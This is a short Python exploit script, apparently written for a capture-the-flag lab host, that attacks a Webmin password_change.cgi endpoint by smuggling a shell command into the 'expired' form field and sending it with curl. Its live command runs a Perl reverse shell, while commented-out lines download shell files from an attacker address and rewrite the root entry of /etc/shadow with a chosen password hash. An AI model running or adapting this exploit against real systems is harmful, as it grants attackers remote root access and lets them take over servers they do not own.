import os

target = "source.thm"
port = "10000"
url = "https://"+target+":"+port+"/password_change.cgi"

rhost = "10.2.116.12"
rport = 2222

#command = f"wget http:{rhost}:8000/shell.php"
# command = "curl -o perl_shell.pl http://10.2.116.12:8000/perl_shell.pl"

root_value = "root:$6$xyz$9vc9yeDgngEirzYEeLZqCay8YLhc7JHmd1t2UYrjdm7dD0M6raCXz.xtEXBL4.aaRf26S/aKagS36D1iH7E79.:18295:0:99999:7:::"
something = "NR==1 {$0=" + root_value + "} 1"
#command = "awk " + something + " /etc/shadow > tmpfile && mv tmpfile /etc/shadow"
command = "perl perl_shell.pl"

header = f'Referer: https://{target}:{port}/session_login.cgi'
payload = f'user=gotroot&pam=&expired=2|echo "";{command}'

os.system(f"curl -k {url} -d '{payload}' -H '{header}'")
